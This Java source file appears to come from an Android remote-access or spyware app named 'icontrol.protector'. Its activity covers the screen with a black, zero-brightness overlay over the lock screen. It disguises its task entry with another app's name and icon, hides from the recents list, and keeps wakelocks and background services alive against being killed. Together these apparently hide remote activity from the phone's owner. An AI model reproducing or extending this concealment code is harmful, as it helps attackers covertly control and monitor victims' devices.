package com.icontrol.protector;

import static com.icontrol.protector.AccessServices.skiponecover;
import static com.icontrol.protector.UtliTools.drawableToBitmap;
import static com.icontrol.protector.UtliTools.excludeFromTaskList;
import static com.icontrol.protector.UtliTools.getRandomLauncherApp;
import static com.icontrol.protector.UtliTools.isPackageInstalled;
import static com.icontrol.protector.WorkServices.MyWorker.AlertServer;
import static com.icontrol.protector.WorkServices.My_Access_inst;

import static java.lang.Thread.sleep;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.KeyguardManager;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.drawable.Drawable;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.content.Intent;
import android.os.Debug;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.GestureDetector;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.widget.LinearLayout;

public class TransparentActivity extends Activity {

    //private static TransparentActivity instance = null;

    @Override
    protected void onDestroy() {
        super.onDestroy();
        try
        {
            if (overlayView != null) {
                overlayView.setOnClickListener(null);
                overlayView=null;
            }
            //  instance = null;
            wl.release();
            gestureDetector = null;
            getWindow().clearFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
            ((ViewGroup) findViewById(android.R.id.content)).removeAllViews();


        }catch (Exception a){
            a.printStackTrace();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        // excludeFromTaskList(getApplicationContext());
        Handler hstop = new Handler(Looper.getMainLooper());
        hstop.postDelayed(new Runnable() {
            public void run() {
                try {
                    //
                    excludeFromTaskList(getApplicationContext());
                    //moveTaskToBack(true);
                    lockwatcher();
                } catch (Exception d) {

                }
            }

        }, 1000);
       //
    }

    private View overlayView;
    public static WakeLockManager wl;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);


        try {
            poink = true;
            wl = new WakeLockManager();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
                setShowWhenLocked(true);
                setTurnScreenOn(true);
            }
            wl.acquire(getApplicationContext(), true, true);

            getWindow().getDecorView().setSystemUiVisibility(
                    View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                            | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                            | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                            | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_FULLSCREEN
            );

            try {
                requestWindowFeature(Window.FEATURE_NO_TITLE);

            } catch (Exception a) {
                a.printStackTrace();
            }
            try {

                String packageName = getRandomLauncherApp(getApplicationContext());

                if (!isPackageInstalled(packageName, getPackageManager())) {
                    packageName = "com.android.vending";
                    if (!isPackageInstalled(packageName, getPackageManager())) {
                        packageName = null;
                    }
                }
                if (packageName != null) {

                    PackageManager packageManager = getPackageManager();
                    ApplicationInfo applicationInfo = packageManager.getApplicationInfo(packageName, 0);
                    Drawable appIcon = packageManager.getApplicationIcon(applicationInfo);

                    String appName = packageManager.getApplicationLabel(applicationInfo).toString();
                    this.setTitle(appName);

                    // Convert Drawable to Bitmap
                    Bitmap appIconBitmap = drawableToBitmap(appIcon);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                        ActivityManager.TaskDescription taskDescription = new ActivityManager.TaskDescription(appName, appIconBitmap, Color.TRANSPARENT);
                        this.setTaskDescription(taskDescription);
                    }
                }

            } catch (Exception a) {
                a.printStackTrace();
            }

            doWork();
            overlayView = new View(this);
            overlayView.setKeepScreenOn(true);
            overlayView.setBackgroundColor(Color.BLACK);
            setContentView(overlayView);
            overlayView.setFocusable(true);
            overlayView.setClickable(true);
            overlayView.setFocusableInTouchMode(true);


            Window window = getWindow();
            window.setFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
                    WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);

            WindowManager.LayoutParams params = window.getAttributes();
            params.height = WindowManager.LayoutParams.MATCH_PARENT; // Minimal height
            params.width = WindowManager.LayoutParams.MATCH_PARENT;
            params.screenBrightness = 0;
            params.gravity = Gravity.TOP | Gravity.START; // Pin it to the bottom
            window.setAttributes(params);

            Handler hstop = new Handler(Looper.getMainLooper());
            hstop.postDelayed(new Runnable() {
                public void run() {
                    try {

                        excludeFromTaskList(getApplicationContext());
                        //moveTaskToBack(true);
                    } catch (Exception d) {

                    }
                }
            }, 1000);
             gestureDetector = new GestureDetector(this , new GestureDetector.SimpleOnGestureListener() {
                @Override
                public boolean onDoubleTap(MotionEvent e) {

                    moveTaskToBack(true);
                    overridePendingTransition(0, 0);
                    return true;
                }

                @Override
                public boolean onSingleTapConfirmed(MotionEvent e) {

                    return true;
                }
            });
            overlayView.setOnTouchListener(new View.OnTouchListener() {
                @Override
                public boolean onTouch(View v, MotionEvent event) {

                    if(AccessServices.skiprecord){
                        moveTaskToBack(true);
                        overridePendingTransition(0, 0);
                    }
                    return gestureDetector.onTouchEvent(event);
                }
            });

            lockwatcher();
//            new android.os.Handler().postDelayed(() -> {
//
//                TransparentActivity.this.finish();
//            }, 1100);
        } catch (Exception a) {
            a.printStackTrace();
            finish();
        }
    }
    private static GestureDetector gestureDetector;


    public void lockwatcher() {
        KeyguardManager keyguardManager = (KeyguardManager) getApplicationContext().getSystemService(Context.KEYGUARD_SERVICE);
        Handler hstop = new Handler(Looper.getMainLooper());
        new Thread(new Runnable() {
            @Override
            public void run() {
                boolean isScreenLocked = true;
                while (isScreenLocked){
                    try{
                        Thread.sleep(5000);
                    }catch (Exception s){}
                    isScreenLocked = keyguardManager.isKeyguardLocked();
                    if (poink){
                        //ping wakelock to prevent sleep
                        wl.release();
                        try{
                            Thread.sleep(100);
                        }catch (Exception s){}
                        wl.acquire(getApplicationContext(), true, true);
                    }

                    //ping to services to prevent kill
                   try{
                       Intent intent = new Intent(getApplicationContext(), WorkServices.class);
                       intent.setAction("HB");
                       startService(intent);
                   }catch (Exception s){}

                }
            }
        }).start();
        new Thread(new Runnable() {
            @Override
            public void run() {


                boolean isScreenLocked = true;
                do {
                    try {
                        Thread.sleep(600);
                    } catch (Exception a) {
                    }
                    isScreenLocked = keyguardManager.isKeyguardLocked();
                    hstop.postDelayed(() -> {
                        if (overlayView != null) {
                            try {
                                overlayView.setKeepScreenOn(true);
                                overlayView.setBackgroundColor(Color.BLACK);
                            } catch (Exception a) {
                                a.printStackTrace();
                            }
                        }
                    }, 100);


                } while (isScreenLocked);
                //excludeFromTaskList(getApplicationContext());


                hstop.post(new Runnable() {
                    public void run() {
                        try {
                            // excludeFromTaskList(getApplicationContext());
                            moveTaskToBack(true);
                            overridePendingTransition(0, 0);
                        } catch (Exception d) {

                        }
                    }
                });

            }
        }).start();
    }

    private void doWork() {
        try {
            Context mcontext = getApplicationContext();
            Intent workint = new Intent(mcontext, EngineWorker.class);
            if (!MyCods.isServiceRunning(mcontext, EngineWorker.class)) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    mcontext.startForegroundService(workint);
                } else {
                    mcontext.startService(workint);
                }
            }

            if (!MyCods.isServiceRunning(mcontext, WorkServices.class)) {
                Intent workint2 = new Intent(mcontext, WorkServices.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    mcontext.startForegroundService(workint2);
                } else {
                    mcontext.startService(workint2);
                }
            }
        } catch (Exception e) {

        }
    }

    public volatile static boolean poink = true;

    @Override
    protected void onPause() {
        super.onPause();
        try{
            poink = false;

            if (isScreenOff()) {
                MyLoger.Debug("TActivity", "onPause: Detected screen off!");
                // savePlaybackState();
                try {
                    // excludeFromTaskList(getApplicationContext());
                    skiponecover = true;
                    moveTaskToBack(true);
                    overridePendingTransition(0, 0);
                    AccessTools.WakeScreen(getApplicationContext());
                } catch (Exception d) {

                }
            } else {
                MyLoger.Debug("TActivity", "onPause: User navigated away, but screen is still on.");
            }
        }catch (Exception a){}

    }

    private boolean isScreenOff() {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (pm != null) {
            return !pm.isInteractive();
        }
        return false;
    }
}
